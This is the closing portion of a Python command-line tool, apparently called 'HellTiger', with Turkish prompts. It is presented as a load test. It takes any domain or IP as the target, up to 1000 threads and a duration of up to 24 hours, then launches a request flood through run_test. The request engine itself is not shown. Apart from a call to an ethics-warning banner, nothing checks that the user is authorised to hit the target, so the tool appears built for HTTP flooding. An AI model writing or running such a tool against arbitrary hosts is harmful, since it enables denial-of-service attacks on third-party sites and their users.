            print(f"{Colors.RED}[!] Test sırasında hata oluştu: {e}{Colors.END}")

def parse_time_input(time_str):
    """Kullanıcı zaman girdisini saniyeye çevir"""
    time_str = time_str.lower().strip()
    
    if 'saat' in time_str or 'h' in time_str:
        hours = int(''.join(filter(str.isdigit, time_str)))
        return hours * 3600
    elif 'dakika' in time_str or 'm' in time_str:
        minutes = int(''.join(filter(str.isdigit, time_str)))
        return minutes * 60
    elif 'saniye' in time_str or 's' in time_str:
        seconds = int(''.join(filter(str.isdigit, time_str)))
        return seconds
    else:
        # Sadece sayı verilmişse saniye olarak kabul et
        return int(time_str)

def get_user_input():
    """Kullanıcıdan test parametrelerini al"""
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                            TEST YAPILANDIRMASI                             {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
    
    # Hedef URL
    while True:
        print(f"\n{Colors.BOLD}🎯 HEDEF ADRES{Colors.END}")
        target = input(f"{Colors.GREEN}   Domain veya IP adresi girin: {Colors.YELLOW}").strip()
        if target:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            break
        print(f"{Colors.RED}   [!] Lütfen geçerli bir domain/IP adresi girin.{Colors.END}")
    
    # Thread sayısı
    while True:
        try:
            print(f"\n{Colors.BOLD}🔥 THREAD SAYISI{Colors.END}")
            print(f"{Colors.GRAY}   Öneriler: 25 (Hafif), 50 (Normal), 100 (Yoğun), 200+ (Aşırı){Colors.END}")
            threads_input = input(f"{Colors.GREEN}   Thread sayısı [varsayılan: 50]: {Colors.YELLOW}").strip()
            threads = int(threads_input) if threads_input else 50
            if 1 <= threads <= 1000:
                break
            print(f"{Colors.RED}   [!] Thread sayısı 1-1000 arasında olmalıdır.{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}   [!] Lütfen geçerli bir sayı girin.{Colors.END}")
    
    # Test süresi
    while True:
        try:
            print(f"\n{Colors.BOLD}⏱️  TEST SÜRESİ{Colors.END}")
            print(f"{Colors.GRAY}   Formatlar: '30' (30 saniye), '5m' (5 dakika), '1saat' (1 saat){Colors.END}")
            duration_input = input(f"{Colors.GREEN}   Test süresi [varsayılan: 60 saniye]: {Colors.YELLOW}").strip()
            
            if not duration_input:
                duration = 60
            else:
                duration = parse_time_input(duration_input)
            
            if 1 <= duration <= 24*3600:  # Maksimum 24 saat
                break
            print(f"{Colors.RED}   [!] Test süresi 1 saniye - 24 saat arasında olmalıdır.{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}   [!] Lütfen geçerli bir süre formatı girin.{Colors.END}")
    
    # Timeout süresi
    while True:
        try:
            print(f"\n{Colors.BOLD}⚡ İSTEK TIMEOUT{Colors.END}")
            print(f"{Colors.GRAY}   İstek başına maksimum bekleme süresi{Colors.END}")
            timeout_input = input(f"{Colors.GREEN}   Timeout süresi (saniye) [varsayılan: 5]: {Colors.YELLOW}").strip()
            timeout = int(timeout_input) if timeout_input else 5
            if 1 <= timeout <= 30:
                break
            print(f"{Colors.RED}   [!] Timeout süresi 1-30 saniye arasında olmalıdır.{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}   [!] Lütfen geçerli bir sayı girin.{Colors.END}")
    
    # Hız seviyesi belirleme
    if threads > 200:
        intensity = f"🔴 AŞIRI YÜKSEK"
        intensity_color = Colors.RED
    elif threads > 100:
        intensity = f"🟠 YÜKSEK"
        intensity_color = Colors.RED
    elif threads > 50:
        intensity = f"🟡 ORTA"
        intensity_color = Colors.YELLOW
    else:
        intensity = f"🟢 DÜŞÜK"
        intensity_color = Colors.GREEN
    
    def format_duration_display(seconds):
        if seconds < 60:
            return f"{seconds} saniye"
        elif seconds < 3600:
            minutes = seconds // 60
            secs = seconds % 60
            return f"{minutes} dakika" + (f" {secs} saniye" if secs > 0 else "")
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            return f"{hours} saat" + (f" {minutes} dakika" if minutes > 0 else "")
    
    # Test özeti göster
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                               TEST ÖZETİ                                  {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎯 Hedef:{Colors.END} {Colors.YELLOW}{target[:62]:<62}{Colors.END} {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🔥 Thread Sayısı:{Colors.END} {Colors.YELLOW}{threads:<55}{Colors.END} {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⏱️  Test Süresi:{Colors.END} {Colors.YELLOW}{format_duration_display(duration):<55}{Colors.END} {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⚡ Timeout:{Colors.END} {Colors.YELLOW}{timeout} saniye{Colors.END}                                            {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📊 Yoğunluk:{Colors.END} {intensity_color}{intensity}{Colors.END}                                        {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
    
    # Tahmini performans bilgisi
    estimated_rps = threads * 0.8  # Tahmini RPS
    estimated_total = estimated_rps * duration
    
    print(f"\n{Colors.BOLD}📈 TAHMİNİ PERFORMANS{Colors.END}")
    print(f"{Colors.GRAY}   • Tahmini RPS: ~{estimated_rps:.0f} istek/saniye{Colors.END}")
    print(f"{Colors.GRAY}   • Tahmini Toplam İstek: ~{estimated_total:,.0f} istek{Colors.END}")
    print(f"{Colors.GRAY}   • Sistem yükü izlenecek ve raporlanacak{Colors.END}")
    
    # Son onay
    while True:
        print(f"\n{Colors.BOLD}🚀 Test başlatılsın mı?{Colors.END}")
        confirm = input(f"{Colors.GREEN}   Bu ayarlarla teste başlamak istiyor musunuz? (E/h): {Colors.YELLOW}").strip().upper()
        if confirm in ['E', 'EVET', 'Y', 'YES', '']:
            return target, threads, duration, timeout
        elif confirm in ['H', 'HAYIR', 'N', 'NO']:
            print(f"{Colors.RED}   [!] Test iptal edildi.{Colors.END}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}   [!] Lütfen 'E' (Evet) veya 'H' (Hayır) yazın.{Colors.END}")

def main():
    """Ana program fonksiyonu"""
    try:
        # HellTiger örneği oluştur
        helltiger = HellTigerCore()
        
        # Banner ve etik uyarı göster
        helltiger.display_banner()
        helltiger.display_ethics_warning()
        
        # Sistem gereksinimleri kontrolü
        print(f"{Colors.CYAN}[*] Sistem gereksinimleri kontrol ediliyor...{Colors.END}")
        
        # CPU çekirdek sayısı
        try:
            cpu_cores = psutil.cpu_count()
        except (PermissionError, OSError):
            # Termux'ta alternatif yöntem
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpu_cores = len([line for line in f if line.startswith('processor')])
            except:
                cpu_cores = 4  # Varsayılan değer
        
        try:
            available_memory = psutil.virtual_memory().total / (1024**3)
        except (PermissionError, OSError):
            # Termux'ta alternatif yöntem
            try:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemTotal:'):
                            available_memory = int(line.split()[1]) / (1024**2)  # kB to GB
                            break
                    else:
                        available_memory = 4.0  # Varsayılan değer
            except:
                available_memory = 4.0  # Varsayılan değer
        
        print(f"{Colors.GREEN}✓ CPU Çekirdekleri: {cpu_cores}{Colors.END}")
        print(f"{Colors.GREEN}✓ Toplam RAM: {available_memory:.1f} GB{Colors.END}")
        
        if GPU_AVAILABLE:
            try:
                gpus = GPUtil.getGPUs()
                if gpus:
                    print(f"{Colors.GREEN}✓ GPU Algılandı: {gpus[0].name}{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}! GPU bulunamadı - CPU izleme aktif{Colors.END}")
            except:
                print(f"{Colors.YELLOW}! GPU durumu okunamadı{Colors.END}")
        else:
            print(f"{Colors.YELLOW}! GPUtil kütüphanesi bulunamadı - GPU izleme devre dışı{Colors.END}")
            print(f"{Colors.GRAY}  (GPU izleme için: pip install GPUtil){Colors.END}")
        
        time.sleep(2)
        
        # Kullanıcıdan parametreleri al
        target_url, threads, duration, timeout = get_user_input()
        
        # Test çalıştır
        helltiger.run_test(
            target_url=target_url,
            threads=threads,
            duration=duration,
            timeout=timeout
        )
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program kullanıcı tarafından sonlandırıldı, YİNE BEKLERİZ 🖐️.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Beklenmeyen hata: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
